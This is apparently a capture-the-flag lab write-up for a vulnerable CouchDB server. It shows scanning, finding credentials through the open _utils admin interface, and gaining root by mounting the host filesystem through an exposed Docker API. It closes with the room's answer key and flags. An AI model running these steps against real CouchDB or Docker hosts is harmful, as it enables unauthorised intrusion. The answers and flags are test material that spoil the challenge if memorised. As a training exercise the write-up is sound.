---
Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.
---

### rustscan

> found port 22, 5984

### feroxbuster

```
feroxbuster --url http://10.10.26.128:5984/ -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
```

> found secret, _stats, _logs, _utils and more with status 200

`curl -X GET http://127.0.0.1:5984/_all_dbs` ==found in 10.10.26.128:5984/_utils/docs/intro/tour.html==

> http://10.10.26.128:5984/_utils/document.html?secret/a1320dd69fb4570d0a3d26df4e000be7 -> atena:t4qfzcc4qN##

### ssh

```
ssh atena@10.10.26.128 
```

### history

```
netstat -antup
```
```
cat ~/.bash_history
```

> docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

### priv esc

> There is docker running in this host. Lets run the docker

[docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising)

```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

```
find . -name root.txt 2>/dev/null
```

```
cat mnt/root/root.txt
```

- Scan the machine. How many ports are open?*2*
- What is the database management system installed on the server?*CouchDB*
- What port is the database management system running on?*5984*
- What is the version of the management system installed on the server?*1.6.1*
- What is the path for the web administration tool for this database management system?*_utils*
- What is the path to list all databases in the web browser of the database management system?*_all_dbs*
- What are the credentials found in the web administration tool?*atena:t4qfzcc4qN##*
- Compromise the machine and locate user.txt*THM{1ns3cure_couchdb}*
- Escalate privileges and obtain root.txt*THM{RCE_us1ng_Docker_API}*
